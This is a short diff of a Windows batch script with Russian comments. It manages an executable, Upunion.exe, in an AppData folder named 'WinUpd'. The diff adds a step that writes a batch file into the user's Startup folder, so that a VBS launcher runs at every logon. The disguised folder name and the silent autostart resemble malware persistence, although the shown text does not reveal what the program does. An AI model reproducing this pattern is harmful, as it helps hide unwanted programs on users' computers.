@@ -6,6 +6,9 @@ set "folder=%appdata%\WinUpd"
 set "upunion=%folder%\Upunion.exe"
 set "jossol=%folder%\jossol.bat"
 set "vbsfile=%folder%\run_jossol.vbs"
+set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+set "autostart_bat=run_script.bat"
+set "vbs_script=C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run_jossol.vbs"
 
 rem Проверяем, существует ли папка, если нет - создаем её
 if not exist "%folder%" (
@@ -72,6 +75,12 @@ if %ERRORLEVEL% NEQ 0 (
 ) else (
     echo Process Upunion.exe is running.
 )
+
+(
+    echo @echo off
+    echo wscript.exe "!vbs_script!"
+    echo exit
+) > "!startup_folder!\!autostart_bat!"
 
 rem Задержка в цикле, чтобы не перегружать систему
 timeout /t 10 >nul
